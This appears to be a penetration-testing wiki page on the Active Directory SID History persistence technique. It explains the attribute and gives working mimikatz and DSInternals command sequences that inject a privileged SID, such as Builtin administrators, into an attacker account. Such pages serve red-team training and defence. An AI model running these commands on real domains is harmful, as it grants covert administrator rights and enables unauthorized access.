# SID History

## Theory

The **SID (Security Identifier)** is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.

The **SID history** is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

This mechanism can also be abused as a means of persistence: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added.

For instance, the SID of an account with Domain Admin rights can be added to a normal user SID History to grant them Domain Admin rights (the rights would not be granted per say, but the modified account would be treated as domain admin when checking rights).

## Practice

{% hint style="danger" %}
There is currently no way to exploit this technique purely from a distant UNIX-like machine, as it requires some operations on specific Windows processes' memory.
{% endhint %}

### Pre-Windows 2016

Modifying the SID History attribute of an object can be done using mimikatz, with the [`sid::patch`](https://tools.thehacker.recipes/mimikatz/modules/sid/patch), [`sid::add`](https://tools.thehacker.recipes/mimikatz/modules/sid/add) and [`sid::lookup`](https://tools.thehacker.recipes/mimikatz/modules/sid/lookup) commands.

Mimikatz cannot be used on 2016+ domain controllers for that purpose, due to an error with [`sid::patch`](https://tools.thehacker.recipes/mimikatz/modules/sid/patch) ([https://github.com/gentilkiwi/mimikatz/issues/348](https://github.com/gentilkiwi/mimikatz/issues/348))

{% hint style="warning" %}
Mimikatz must be launched with at least enough privileges to perform the [`privilege::debug`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) command (i.e. domain admin or `SYSTEM`).
{% endhint %}

```batch
# Generic command
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:UserRecievingTheSID /new:SIDOfTheTargetedUserOrGroup"

# Example 1 : Use this command to inject the SID of built-in administrator account to the SID-History attribute of AttackerUser
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:Builtin\administrators "

# Example 2 : Use sid::lookup to retrieve the SID of an account and inject it to the SID-History attribute of AttackerUser
mikikatz.exe "sid::lookup /name:InterestingUser"
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:SIDOfInterestingUser"
```

### Post-Windows 2016

The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module [DSInternals](https://github.com/MichaelGrafnetter/DSInternals). This method also works for Pre-Windows 2016 domain controllers.

{% hint style="danger" %}
The NTDS service must be stopped at some point and restarted for this procedure to work, which can cause various issues. Proceed with care, avoid production systems.
{% endhint %}

```powershell
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit

# Start the NTDS service
Start-service NTDS
```

## Resources

{% embed url="https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory" %}

{% embed url="https://attack.mitre.org/techniques/T1134/005/" %}

{% embed url="https://adsecurity.org/?p=1772" %}

{% embed url="https://forum.winbatch.com/index.php?topic=1545.0" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory#operational-constraints" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya" %}

{% embed url="https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/" %}
